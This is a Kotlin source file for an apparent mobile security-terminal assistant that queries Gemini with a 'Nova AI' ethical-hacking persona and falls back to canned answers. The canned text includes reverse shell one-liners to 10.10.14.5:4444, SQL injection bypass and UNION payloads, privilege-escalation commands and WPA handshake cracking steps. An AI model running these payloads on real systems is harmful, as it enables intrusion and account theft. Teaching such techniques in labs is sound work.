package com.example.engine

import com.example.BuildConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

data class AiMessage(
    val id: String = java.util.UUID.randomUUID().toString(),
    val sender: AiSender,
    val text: String,
    val timestamp: Long = System.currentTimeMillis(),
    val suggestedCommands: List<String> = emptyList()
)

enum class AiSender {
    USER,
    CYBER_AI,
    SYSTEM
}

object AiCyberAssistantEngine {

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .build()

    suspend fun query(prompt: String): AiMessage = withContext(Dispatchers.IO) {
        val trimmed = prompt.trim()
        val geminiKey = try {
            val keyField = BuildConfig::class.java.getField("GEMINI_API_KEY")
            keyField.get(null) as? String ?: ""
        } catch (_: Exception) {
            ""
        }

        if (geminiKey.isNotBlank() && !geminiKey.contains("MY_GEMINI_API_KEY")) {
            val cloudResponse = queryGeminiCloud(trimmed, geminiKey)
            if (cloudResponse != null) {
                return@withContext cloudResponse
            }
        }

        // High-intelligence Offline Cyber Knowledge Engine
        return@withContext generateExpertCyberResponse(trimmed)
    }

    private fun queryGeminiCloud(prompt: String, apiKey: String): AiMessage? {
        return try {
            val endpoint = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=$apiKey"
            val systemInstruction = "You are Nova AI, an expert cybersecurity terminal co-pilot and ethical hacking assistant. Provide concise, powerful technical commands, explanations, Python/Bash scripts, and security defense advice. Always format commands in single backticks or code blocks."

            val json = JSONObject().apply {
                put("contents", JSONArray().apply {
                    put(JSONObject().apply {
                        put("parts", JSONArray().apply {
                            put(JSONObject().apply {
                                put("text", "$systemInstruction\n\nUser request: $prompt")
                            })
                        })
                    })
                })
            }

            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder().url(endpoint).post(body).build()

            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return null
                val resBody = response.body?.string() ?: return null
                val resJson = JSONObject(resBody)
                val text = resJson.getJSONArray("candidates")
                    .getJSONObject(0)
                    .getJSONObject("content")
                    .getJSONArray("parts")
                    .getJSONObject(0)
                    .getString("text")

                val suggestions = extractCommands(text)
                AiMessage(
                    sender = AiSender.CYBER_AI,
                    text = text,
                    suggestedCommands = suggestions
                )
            }
        } catch (_: Exception) {
            null
        }
    }

    fun generateExpertCyberResponse(prompt: String): AiMessage {
        val lower = prompt.lowercase()

        val (response, commands) = when {
            lower.contains("nmap") || lower.contains("port scan") || lower.contains("recon") -> {
                Pair(
                    """
                    |🛡️ [NOVA RECON ENGINE - NMAP & PORT SCANNING GUIDE]
                    |
                    |Nmap (Network Mapper) is the primary discovery tool:
                    |
                    |• Fast SYN Stealth Scan:
                    |  `nmap -sS -T4 -p- 192.168.1.1`
                    |
                    |• Service & OS Version Detection + Default Scripts:
                    |  `nmap -sV -sC -O -v 192.168.1.1`
                    |
                    |• UDP Port Scan (Top 100 ports):
                    |  `nmap -sU --top-ports 100 192.168.1.1`
                    |
                    |• Vulnerability Scanning with NSE scripts:
                    |  `nmap --script "vuln and safe" 192.168.1.1`
                    |
                    |Tip: In CypherDeck, you can also run live real socket scanning using the command:
                    |`portscan <target>` directly in this terminal!
                    """.trimMargin(),
                    listOf("portscan google.com", "portscan 192.168.1.1", "dig google.com")
                )
            }

            lower.contains("python") || lower.contains("scanner") && lower.contains("script") -> {
                Pair(
                    """
                    |🐍 [NOVA SCRIPT ENGINE - MULTI-THREADED PORT SCANNER]
                    |
                    |Here is an optimized Python socket scanner:
                    |
                    |```python
                    |import socket
                    |from concurrent.futures import ThreadPoolExecutor
                    |
                    |def scan_port(host, port):
                    |    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    |        s.settimeout(0.5)
                    |        if s.connect_ex((host, port)) == 0:
                    |            print(f"[+] Port {port} OPEN")
                    |
                    |target = "127.0.0.1"
                    |common_ports = [21, 22, 23, 25, 53, 80, 443, 3306, 8080]
                    |with ThreadPoolExecutor(max_workers=50) as executor:
                    |    for p in common_ports:
                    |        executor.submit(scan_port, target, p)
                    |```
                    |You can save and test this script directly in the 'Script Studio' tab!
                    """.trimMargin(),
                    listOf("script list", "sysinfo", "ping 127.0.0.1")
                )
            }

            lower.contains("reverse shell") || lower.contains("shell") || lower.contains("netcat") -> {
                Pair(
                    """
                    |⚡ [PAYLOAD ENGINE - REVERSE SHELLS (EDUCATIONAL / LAB)]
                    |
                    |Listen on attacking machine:
                    |`nc -lvnp 4444`
                    |
                    |1. Bash TCP:
                    |`bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`
                    |
                    |2. Netcat Traditional:
                    |`nc 10.10.14.5 4444 -e /bin/bash`
                    |
                    |3. Python 3:
                    |`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`
                    |
                    |4. Socat TTY Upgrade:
                    |`socat file:`tty`,raw,echo=0 tcp-listen:4444`
                    """.trimMargin(),
                    listOf("curl https://httpbin.org/get", "hash sha256 cyberdeck")
                )
            }

            lower.contains("sql") || lower.contains("sqli") || lower.contains("injection") -> {
                Pair(
                    """
                    |💉 [OWASP A03 - SQL INJECTION MECHANICS & REMEDIATION]
                    |
                    |• Authentication Bypass Test:
                    |  `admin' OR '1'='1' --`
                    |  `' UNION SELECT null, username, password FROM users --`
                    |
                    |• Error-Based Fingerprinting:
                    |  `' AND 1=CONVERT(int, (SELECT @@version)) --`
                    |
                    |• Remediation (Prepared Statements):
                    |  Always use parameterized queries with PDO / PreparedStatement:
                    |  `stmt = conn.prepareStatement("SELECT * FROM users WHERE email = ?");`
                    |  `stmt.setString(1, userInput);`
                    """.trimMargin(),
                    listOf("http https://example.com", "whois cloudflare.com")
                )
            }

            lower.contains("privesc") || lower.contains("privilege") || lower.contains("root") -> {
                Pair(
                    """
                    |👑 [LINUX PRIVILEGE ESCALATION CHECKLIST]
                    |
                    |1. Sudo permissions without password:
                    |   `sudo -l`
                    |
                    |2. Search SUID binaries:
                    |   `find / -perm -u=s -type f 2>/dev/null`
                    |
                    |3. Inspect cron jobs & timers:
                    |   `cat /etc/crontab`
                    |   `ls -la /etc/cron.*`
                    |
                    |4. Check internal listening ports:
                    |   `netstat -tlpn` or `ss -tulpn`
                    |
                    |5. Inspect writable directories:
                    |   `find / -writable -type d 2>/dev/null`
                    """.trimMargin(),
                    listOf("sysinfo", "help", "matrix")
                )
            }

            lower.contains("hash") || lower.contains("crack") || lower.contains("sha") || lower.contains("md5") -> {
                Pair(
                    """
                    |🔐 [CRYPTOGRAPHY & HASHING ENGINE]
                    |
                    |CypherDeck supports instant hashing and hash identification:
                    |
                    |• Generate Hash:
                    |  `hash sha256 HelloCypherDeck`
                    |  `hash md5 password123`
                    |
                    |• Identify Hash Algorithm:
                    |  `hashid 5d41402abc4b2a76b9719d911017c592`
                    |
                    |• Encode / Decode:
                    |  `encode base64 secret_token`
                    |  `decode hex 48656C6C6F`
                    """.trimMargin(),
                    listOf("hash sha256 admin123", "hashid 5d41402abc4b2a76b9719d911017c592", "encode base64 root:toor")
                )
            }

            lower.contains("wifi") || lower.contains("wireless") || lower.contains("aircrack") -> {
                Pair(
                    """
                    |📡 [WIRELESS SECURITY & AUDITING WORKFLOW (EDUCATIONAL)]
                    |
                    |Standard Wi-Fi Security Audit steps:
                    |1. Put card in monitor mode:
                    |   `airmon-ng start wlan0`
                    |2. Capture beacon frames & active BSSIDs:
                    |   `airodump-ng wlan0mon`
                    |3. Capture 4-way WPA2 handshake on target channel:
                    |   `airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon`
                    |4. Audit dictionary strength:
                    |   `aircrack-ng -w wordlist.txt capture-01.cap`
                    |
                    |Security Defense: Use WPA3-SAE (Simultaneous Authentication of Equals) to prevent offline dictionary attacks.
                    """.trimMargin(),
                    listOf("subnets", "portscan 192.168.1.1")
                )
            }

            else -> {
                Pair(
                    """
                    |🤖 [CYPHER CO-PILOT]
                    |I am your terminal security AI co-pilot. I can assist with:
                    |
                    |• Command syntax: Nmap, Metasploit, Wireshark, Curl, Dig, Netcat
                    |• Scripting: Python socket programming, Bash automation, Port scanners
                    |• Exploitation & Defense: OWASP Top 10, PrivEsc, Security Headers
                    |• Cryptography: Hash generation, JWT decoding, Base64/Hex conversion
                    |
                    |Try asking:
                    |→ "Generate a Python port scanner script"
                    |→ "Explain Nmap scan flags"
                    |→ "How to audit HTTP security headers?"
                    |→ "Show Linux privilege escalation commands"
                    """.trimMargin(),
                    listOf("portscan google.com", "hash sha256 root", "http https://github.com", "sysinfo")
                )
            }
        }

        return AiMessage(
            sender = AiSender.CYBER_AI,
            text = response,
            suggestedCommands = commands
        )
    }

    private fun extractCommands(text: String): List<String> {
        val commands = mutableListOf<String>()
        val codeRegex = Regex("`([^`]+)`")
        codeRegex.findAll(text).forEach { match ->
            val cmd = match.groupValues[1].trim()
            if (cmd.length in 3..60 && !cmd.contains("\n") && !commands.contains(cmd)) {
                commands.add(cmd)
            }
        }
        return commands.take(3)
    }
}
